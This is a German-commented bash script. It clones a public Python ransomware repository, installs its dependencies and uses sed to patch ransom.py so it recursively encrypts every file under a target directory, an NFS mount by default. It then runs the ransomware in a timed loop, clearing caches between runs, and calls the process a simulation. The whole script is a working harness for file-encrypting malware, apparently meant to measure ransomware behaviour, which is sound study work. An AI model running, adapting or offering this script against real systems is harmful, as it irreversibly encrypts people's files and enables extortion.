#!/bin/bash

# --- 1. PARAMETER-HANDLING ---
if [[ "$1" == "run" ]]; then
    shift
fi

TARGET_DIR=${1:-"/mnt/nfs/000/"}
DURATION=${2:-"10s"}
CLEAN_DURATION=$(echo $DURATION | sed 's/[^0-9]//g')
[ -z "$CLEAN_DURATION" ] || [ "$CLEAN_DURATION" -eq 0 ] && CLEAN_DURATION=10

REAL_USER=${SUDO_USER:-$(whoami)}
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$SCRIPT_DIR/Ransomware-Python"
PY_FILE="$REPO_DIR/ransom.py"
VENV_DIR="$REPO_DIR/venv"

as_user() {
    if [ "$(id -u)" -eq 0 ]; then
        sudo -u "$REAL_USER" "$@"
    else
        "$@"
    fi
}

# --- 2. SETUP (ZÄHLT NOCH NICHT ZUR ZEIT) ---
echo "--- VORBEREITUNG (Setup & Installation) ---"

if [ ! -d "$REPO_DIR" ]; then
    as_user git clone https://github.com/serdarumut/Ransomware-Python.git "$REPO_DIR" --quiet
fi

chown -R "$REAL_USER":"$REAL_USER" "$REPO_DIR"
as_user git -C "$REPO_DIR" checkout ransom.py --quiet

if [ ! -d "$VENV_DIR" ]; then
    if ! as_user python3 -m venv "$VENV_DIR"; then
        echo "❌ Konnte kein Python-venv erstellen."
        echo "   Bitte installieren: sudo apt install -y python3-venv python3-pip"
        exit 1
    fi
fi

if ! as_user "$VENV_DIR/bin/python3" -m pip --version >/dev/null 2>&1; then
    as_user "$VENV_DIR/bin/python3" -m ensurepip --upgrade >/dev/null 2>&1 || true
fi
if ! as_user "$VENV_DIR/bin/python3" -m pip --version >/dev/null 2>&1; then
    echo "❌ pip im venv nicht verfügbar: $VENV_DIR"
    echo "   Bitte installieren: sudo apt install -y python3-venv python3-pip"
    exit 1
fi
if ! as_user "$VENV_DIR/bin/python3" -c "import cryptography" >/dev/null 2>&1; then
    if ! as_user "$VENV_DIR/bin/python3" -m pip install cryptography --quiet; then
        echo "❌ Konnte Python-Paket 'cryptography' nicht installieren."
        exit 1
    fi
fi
if ! as_user "$VENV_DIR/bin/python3" -c "import cryptography" >/dev/null 2>&1; then
    echo "❌ 'cryptography' bleibt nicht importierbar."
    exit 1
fi

# --- 3. PATCHING (ZÄHLT NOCH NICHT ZUR ZEIT) ---
as_user sed -i 's/\t/    /g' "$PY_FILE"
as_user sed -i "s|for file in os.listdir():|for root, dirs, filenames in os.walk('$TARGET_DIR'):\n    for file in filenames:|g" "$PY_FILE"
as_user sed -i 's|if file == "ransom.py".*:|        if file in ["ransom.py", "generatedkey.key", "ransomdecrypter.py"]:|g' "$PY_FILE"
as_user sed -i 's|continue|            continue|g' "$PY_FILE"
as_user sed -i "s|if os.path.isfile(file):|        if os.path.isfile(os.path.join(root, file)):|g" "$PY_FILE"
as_user sed -i "s|files.append(file)|            files.append(os.path.join(root, file))|g" "$PY_FILE"

echo "✅ Vorbereitung abgeschlossen."

# --- 4. START DER MESSUNG (HIER BEGINNT DER TIMER) ---
echo "--- START DER VERSCHLÜSSELUNG (Dauer: ${CLEAN_DURATION}s) ---"

START_TIME=$(date +%s)
END_TIME=$((START_TIME + CLEAN_DURATION))
counter=1

while [ $(date +%s) -lt $END_TIME ]; do
    REMAINING=$(( END_TIME - $(date +%s) ))
    [ $REMAINING -le 0 ] && break

    echo "[$(date +%T)] Durchgang $counter (Verfügbar: ${REMAINING}s)"
    
    # Cache leeren
    sync && sysctl -w vm.drop_caches=3 > /dev/null
    
    # Ausführung
    # stdout wird unterdrückt, stderr (Fehler) wird bei Bedarf angezeigt
    ERR_LOG=$(cd "$REPO_DIR" && as_user timeout -k 5s -s INT "${REMAINING}s" "$VENV_DIR/bin/python3" ransom.py 2>&1 > /dev/null)
    EXIT_STATUS=$?

    # --- AUSWERTUNG ---
    if [ $EXIT_STATUS -eq 0 ]; then
        echo "   ✅ Fertig: Alle Dateien im Zielordner verschlüsselt."
    elif [ $EXIT_STATUS -eq 124 ]; then
        echo "   🛑 ABBRUCH: Zeitlimit ($CLEAN_DURATION s) erreicht."
    else
        echo "   ❌ FEHLER im Python-Skript:"
        echo "      $ERR_LOG" | head -n 5
    fi
    
    sleep 1
    ((counter++))
done

echo "🏁 Simulation beendet um: $(date +"%T")"
